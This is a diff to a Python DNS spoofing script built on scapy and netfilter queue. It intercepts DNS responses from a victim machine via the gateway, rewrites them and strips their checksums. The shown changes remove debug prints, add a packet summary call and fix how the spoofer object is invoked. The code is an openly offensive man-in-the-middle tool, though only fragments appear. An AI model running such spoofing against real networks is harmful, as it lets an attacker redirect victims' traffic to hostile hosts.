@@ -32,7 +32,6 @@ class Dns_spoof:
             print("iptables flushed")
         
     def call_back(self, bin_packet):
-        print('packet being processed')
         packet = IP(bin_packet.get_payload())
         if packet.haslayer(DNSRR):
             try:
@@ -47,8 +46,8 @@ class Dns_spoof:
                     del packet[UDP].chksum
             except IndexError as error:
                 return False
+            packet.summary()
             bin_packet.set_payload(bytes(packet))
-        print('packet has been processed')    
         return bin_packet.accept()
 
 if __name__ == '__main__':
@@ -59,4 +58,4 @@ if __name__ == '__main__':
     ipServer = '192.168.178.1' # The IP address of the gateway   
     print('starting spoof') 
     x = Dns_spoof(queue_num, ipVictim, ipServer, host)    
-    x
+    x()
